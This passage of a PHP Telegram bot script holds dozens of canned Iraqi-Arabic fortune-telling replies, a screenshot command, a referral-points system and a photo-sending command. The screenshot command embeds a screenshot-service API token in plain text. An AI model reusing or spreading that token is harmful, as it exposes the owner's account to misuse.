'text'=>"عندج بشارة من موسى ابن جعفر وعندج فرحه عن قريب نذر ناذرته ومموفيته خبر راح يجيج يفرحج دائمن متعوبه من اقرب الناس الج .",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f14"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندج موظوع بي سؤال وجواب وعندج شك ابالج وممرتاحه فراق صاير بينج وبين ناس وان شاء الله اكو رجوع قريب ودائمن محتارة بابسط الامور.️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f15"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"فتح قريب ان شاء الله وعندج نصيب واكفلج امير المؤمنين دخيله وصلي ركعتين قضاة حاجة دير بالج من ناس قريبين عليج يمشون وياج بغير نيه.",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f16"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندج خبر هذا الاسبوع يفرحج اشعلي شموع لمريم العذراء وعندج نصر من اهل البيت واكو شغله متعبتج وضايع حقج بيهة راح يصير بيان من اهل البيت ان شاء الله.️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f17"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اكو زعل وصلح وبشاره خير حلوة بعد ماجنت بشده اكو تفائل و امور للاحسن وخبر حلو وقريب وقضاء حاجه. ",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f18"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"خوف وقلق وتردد اكو رزق قريب اكو سفر اكو خطوبه او رجوع ويه شخص واحذر المقربين بسبب الحقد️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f19"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"ايام حلوة جايتج رغم الدموع قبل ايام اكو بشاره خير من شريفه ع ناخيتها انتي اكو خبر زواج . ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f20"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"_اكو بشاره خير اكو قلق عندك هم بس وراها تغير حال الك صاير شي وياك ضايج منه لتقلق الشي التريدة يصير اكو احد مريض او انت مريض راح تتحسن حالته واكو بشاره من النبي محمد ص .️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f21"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اكو عندج قضاء حاجه هلايام تصير الج اكو ظلم عليج شكد مامهمومه انتي الج ايام جايتج حلوة وفرج قريب️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f22"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اكو زعل وصلح وبشاره خير حلوة بعد ماجنت بشده اكو تفائل و امور للاحسن وخبر حلو وقريب وقضاء حاجه . ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f23"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"الشي النويت عليه يتاخر يله يصير اكو دموع نفسيتك تعبانه بس الج فرج هاي الايام شي حيفرحك وممتوقعه يصير كلش حتفرح بي ان شاء الله. ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f24"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"_عندك ندم ع شي وتحس نفسك ضعيف وتجي ساعات تأيس من كلشي الك بشاره ناخي الزهراء بشارتك منها .",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f25"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اشوفج طالبه حاجه من ام البنين ع اكو عندج منها بشاره ورزق فلوس حتوصلج هلفتره واكو شي ناوية عليه يصير بس شوي صبر️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f26"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اشوف عليك نفس وعيون صايره عندك عكوسات بحياتك ولتريدة يصير عكسه بس اصبر الك فرج. ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f27"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"_تعب وقلق وتفكير بس الج فرحه بحياتج كلش قريبه واكو حدث بحياتج راح يغيرج للاحسن والج اتصال من شخص يفرحج️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f28"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"الج بشاره قريبه من الامام العباس ع اكو شي بالج راح يصير بس صبر شويه. ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f29"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"
_اشوف حزن بكلبك تدعي هوايه الك دعوة مستجابه والك رجوع شخص هاي الفتره واكو عندك زواج قريب اكو بشاره خير هاي الايام .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f30"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"_اكو عندك تغير حال اكو فرج الك انت مهموم وابشارتك من الامام الكاظم ع قريبة ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f31"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"_عندج تسير بامر خايفة منه واكو توفيق بشغلة بسبب دعاء امج اشخاص يستهزؤن بيج بس من يشوفون تتوفقين كل فترة ينصدمون بس يضهرولج المحبة وهمة فرحانين بس العكس شغلات تشوفيهه وتخافين تحجين لتترددين عن شيء وخاصة اذا حق كولي ولتخافين 
والي تفكرين بي يصير باذن اللّهہ .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f32"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"الثقه الزايده شي ماينراد ابدا احذر منها اكو كلام او نفاق او احد يريد يوكعك بمشكله انتبه ،اكو مريض جنتوا شايلين همه راح يتحسن قريبا واكو كذب صاير ،رزقك محدود رغم انو انت شخص منفوس وعليك حسد.
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f33"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"انت طيب وتصدك بكل شي لذلك دايما توكع بلمشاكل ،الصراحه الزايده مو بكل الاوقات ،اكو خلاف وجدل انت عندك واحد احذر منه لان بي ندم بعدين ،اكو خبر حلو واكو بيع وشراء️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f34"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"ايمانك كولش قوي بس اكو حرام رح يصير وانت راح تعرف بي وتسكت عنه ،عندك عزه نفس ويحسبولك حساب انت حضك حلو بس محسود ومنفوس ،اكو علاقه جديده لو شخص انتهت علاقتك بي بس راح يرجع وتصالحون ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f35"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اكو زواج او تحضير لعرس قريب ،انت مستبد وعنيد بس دايما انت الي تخسر من وره عنادك ،لازم توازن بين الامور ،اكو شخص يعارضك دايما لمصلحتك وانت شخص عصبي بس اكو فرج قريب وفرحه️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f36"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"سوء تفاهم وانت الي غلطان اعترف بغلطك لان انت شخص صريح عندك نذر راح توفي وعندك رزق حلو رغم انو انت شخص منفوس .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f37"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"ابشاره من ام البنين ع نذر وراح توفون بي أن شاء الله اكو قسمه حلوه للمتزوجين والي ممتزوج اكو خبر تعيين او رزق قريب لكن انتبهوا لصحه احد مقرب لكم.
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f38"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"مغثوث ومضايق واتحس نفسك مهموم اكو تصرف غلط عندك وعاطفيه زايده ولكل يستغل طيبه قلبك وانت هواي تدعي واكو شخص زعلان عليك راح يبرللك والصلح راح يكون قريب شايل هم ماده بس الفرج قريب️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f39"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"رزق قريب او تعيين احذروا من الاصدقاء اكو موضوع صار قبل فتره راح ينفتح هسه بي اوراق او نقله من مكان لمكان واكو زواج .

️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f40"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"صاحب سمعه طيبه ،عندة ندم هواي ويحس نفسه ضعيف وتجي ساعات ييأس من كولشي رغم هو عنده بشاره قريبه تجي عن طريق اتصال️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f41"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"زعل وصلح وبشاره حلوه بعد ماكنت بشده اكو تفاؤل وامور للاحسن وخبر حلو قريب بس رزقك محدود .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f42"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"خوف وقلق وتردد رغم اكو رزق قريب وطريق حلو وسفر وزياره او خطوبه او رجوع شخص زعلان عن قريب احذر من احد لمقربين بسبب غيرته .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f43"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"ايام حلوه وتغيير للاحسن رغم الدموع والعصبيه الي كانت عندك بلفتره الماضيه وقراراتك كانت مو بمحلها واكو وعود كذب واكو شمات مقربين بس عندك نصر لان ع نيتك وقلبك طيب اكو خبر حلو وللبنات اكو خبر حمل لو تسمعون بحامل .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f44"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اكو صبر وراه فرج الشغله الي نويتي عليها خليه بيد ربج ولاتفكرين بيه وربج يقدم الي بي صالح وعندج شغله تخص شخصين قريبين عليج وعندج رزق قريب ان شاء الله رددي امانه موسى ابن جعفر عندج مراد من باب الحوائج .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f45"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"مخنوكه ومهمومه لكن بعد فتره ترتاحين
اكو شخص قاسي قلبه لاجادليه عوفيه
توكلي على الله وعندج شغله موزينه عوفيه متفيدج واكو ناس ضالميج رددي حسبي الله ونعم الوكيل .

️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f46"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"️️الشغله الي نويتي عليها مقضيه وقريبه بس اكو مكان لاتروحيله موزين شغله سحر وشعوذه ويجوز تعرفين ناس تروح لهيح مكانات لازم تمنعيهم رددي يارب السموات والارض .

",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f47"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اكو كذب وتحذير وناس مقدميلج نصيحه التزمي بيه رددي كهيعص
عندج خطوبه قريبه بالاشهر الجايه زينه وصالحه الج هواي تحبين الخير وعندج اعمال صالحه


️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f48"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"واكعه بمشكله ربج ينجيج منها ويطلعج واكو شخص صعب لازم ينهدي ويترك المعاصي محتاره بين امرين لكن اثنين بيهن صالح وخير الحاجه الي نويتي عليها مقضيه بعد فتره ان شاء الله رددي يانور ياالله .
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f49"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"الحاجه الي نويتي عليها مابيها خير
اكو ناس ديكذبون عليج وعليج سحر وتعبانه هواي رددي ياغفور يارحيم .
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f50"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"نويت ع عمل سوف ينجز بحكمه واتقان عليك بلزك والصبر والحكمه مع اعدائك.               ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f51"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"كتم سر قريبا ستبوح بقوه عاطفيتك غالبه عليك ع قراراتك مخلص في عملك تنال كل ماتتمنى.                        


10ــ عزيزي لاتقلق سوف تحصل علا ماتريد ذاته يوم.                       
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f52"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"حقيقة تظهر لك رزقك منفوس يتملكون عليك بالسوء ستنال قريبآ مرتبه عاليه.                                        ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f53"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"اخبار حلووه وبشاره قريبه ورزق رغم قليل هذاي الفتره يجيج/ك عندك شخص راح ينفذ وعده الج /ك اكوو فرح قريب️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f54"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"انـته انسان قوي ومتفائل انسان طموح راح تسمع خبر يفرحك عن قريب لاتئيس انـته انسان ناجح بحياتك ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f55"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"انـته تحس روحك تعبان ومئيس من رحمة الـله بالعكس حياتك طبعيه خليك متفائل عــًْ͜ـہزيـٰٚـِْہزي لاتغلق سوفه تتحقق امنياتك عن قريب.    ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f56"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"تـعبان ومريض تائمن وتفكر اهوايي وتجي ساعات تحس انوو كـلشي واكف والوقت مايتحرك اكوو تحسن بحياتك ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f57"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"مازالت الهموم على قلبك عندك شخص رفيع المستوه اطلب مساعدته راح ينجيك.                               

7ــ واقف وسط اعداء ابشر بالنصر وهلاك كل من ضلمك.                            
️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f58"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندك ابشاره من الامام العباس انته  دائمن تدعي بالامام اكوو الك زواج اوو خطوبه اوو مولود عندك رزق انـته شخص مئمن جدا ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f59"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"انـته انسان هادئ جدآ وتحب الخير الاخرين عندك نجاح من دراسه عندك مريض راح يتحسن ️️",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}

if ($data == "f60"){
bot('editmessagetext',['chat_id'=>$chatid,
'message_id'=>$message_id,
'text'=>"عندك ابشاره من الامام العباس انته  دائمن تدعي بالامام اكوو الك زواج اوو خطوبه اوو مولود عندك رزق انـته شخص مئمن جدا ",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"📋 القائمة الرئيسية .",'callback_data'=>"1"]],
]])]);}
// زر "لقطة شاشة" عند /start
// زر "لقطة شاشة" عند /start
if ($text == "/blag") {
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "أهلاً بك! اختر الزر للحصول على لقطة شاشة.",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => 'لقطة شاشة', 'callback_data' => 'capture_screen']]
            ]
        ])
    ]);
}

// إذا ضغط المستخدم على زر "لقطة شاشة"
// عندما يضغط المستخدم على زر "لقطة شاشة"
// عندما يضغط المستخدم على زر "لقطة شاشة"
// عندما يضغط المستخدم على زر "لقطة شاشة"
if ($data == "capture_screen") {
    // تخزين حالة المستخدم في انتظار الرابط
    file_put_contents("user_state.txt", $chat_id2 . ":waiting_for_url\n", FILE_APPEND);
    
    bot('sendMessage', [
        'chat_id' => $chat_id2,
        'text' => "من فضلك، أرسل رابط الحساب الذي ترغب في أخذ لقطة شاشة له."
    ]);
}

// التحقق من الرابط الذي أرسله المستخدم
if (isset($text)) {
    // تحقق مما إذا كان الرابط يبدأ بـ http:// أو https://
    if (mb_stripos($text, "http://") !== false || mb_stripos($text, "https://") !== false) {
        // تحقق مما إذا كان المستخدم في حالة انتظار رابط
        $state = file_get_contents("user_state.txt");

        // إذا كانت الحالة تشير إلى انتظار الرابط
        if (strpos($state, $chat_id2 . ":waiting_for_url") !== false) {
            // بناء رابط API للحصول على السكرين شوت
            $url = "https://shot.screenshotapi.net/v3/screenshot?token=1VPDVFP-JSN4J58-MAMP3X2-5VB30F4&url=" . urlencode($text) . "&fresh=true&output=image&file_type=png&wait_for_event=load";
            
            // إرسال الصورة بعد أخذ السكرين شوت
            bot('sendPhoto', [
                'chat_id' => $chat_id2,
                'photo' => $url,
                'caption' => "سكرين شوت للرابط: $text"
            ]);

            // مسح حالة المستخدم بعد إرسال السكرين شوت
            $state = str_replace($chat_id2 . ":waiting_for_url\n", "", $state); // مسح الحالة
            file_put_contents("user_state.txt", $state);
        } else {
            // إذا لم يضغط المستخدم على الزر "لقطة شاشة"
            bot('sendMessage', [
                'chat_id' => $chat_id2,
                'text' => "يرجى الضغط على زر 'لقطة شاشة' أولاً قبل إرسال الرابط."
            ]);
        }
    } else {
        // إذا لم يكن الرابط صالحًا
        bot('sendMessage', [
            'chat_id' => $chat_id2,
            'text' => "يرجى إرسال رابط صحيح يبدأ بـ http:// أو https://"
        ]);
    }
}

// تحميل قاعدة بيانات المستخدمين
$users_file = "users.json";
$users = file_exists($users_file) ? json_decode(file_get_contents($users_file), true) : [];

// تحليل أمر /start مع دعوة
$ref_id = null;
if (preg_match('/^\/start (\d+)/', $text, $matches)) {
    $ref_id = $matches[1];
}

// التحقق من إذا كان المستخدم جديد
if (!isset($users[$user_id])) {
    $users[$user_id] = [
        "points" => 0,
        "joined" => time(),
        "invited_by" => $ref_id
    ];

    // إذا فيه ref_id ومو نفسه
    if ($ref_id && $ref_id != $user_id) {
        if (!isset($users[$ref_id])) {
            $users[$ref_id] = ["points" => 1, "joined" => 0];
        } else {
            $users[$ref_id]["points"] += 1;
        }

        // إشعار الداعي
        file_get_contents($website . "/sendMessage?chat_id=$ref_id&text=" . urlencode("🎉 لقد حصلت على 30من النقاط لدعوتك مستخدم جديد!"));
    }

    file_put_contents($users_file, json_encode($users));

    // رسالة ترحيب
    $welcome = "أهلاً بك في البوت! تم تسجيلك بنجاح.";
    file_get_contents($website . "/sendMessage?chat_id=$chat_id&text=" . urlencode($welcome));
}

// أمر /points لعرض النقاط
if ($text == "/points") {
    $points = $users[$user_id]["points"] ?? 0;
    $ref_link = "https://t.me/WAHM_REBOT?start=$user_id"; // ← غيّر USERNAME

    $msg = "
<b>╔══════════════════════╗</b>
<b>║  🎯 نقاطك الحالية: $points  ║</b>
<b>╚══════════════════════╝</b>

<b>🔗 رابط الدعوة الخاص بك:</b>
<code>$ref_link</code>

<b>✨ كل شخص جديد يدخل من خلال الرابط يعطيك 1 نقطة!</b>
";

    // زر مشاركة رابط الدعوة
    $keyboard = [
        "inline_keyboard" => [
            [
                ["text" => "🔗 شارك رابط الدعوة", "switch_inline_query" => $ref_link]
            ]
        ]
    ];

    $data = [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    file_get_contents($website . "/sendMessage?" . http_build_query($data));
}

if ($text == "/IP") {
    // رابط الصورة
    $photo_url = "https://khain.pro/in/vip.png"; // <-- عدل الرابط إذا احتجت

    // النص اللي تحت الصورة
    $caption = "أهلاً بك في البوت! هذه صورة وتعليمات تحتها.";

    // تجهيز بيانات الإرسال
    $url = $website . "/sendPhoto";
    $post_fields = array(
        'chat_id' => $chat_id,
        'photo' => $photo_url,
        'caption' => $caption
    );

    // تنفيذ الطلب
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Type:multipart/form-data"
    ));
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
    $output = curl_exec($ch);
    curl_close($ch);
}
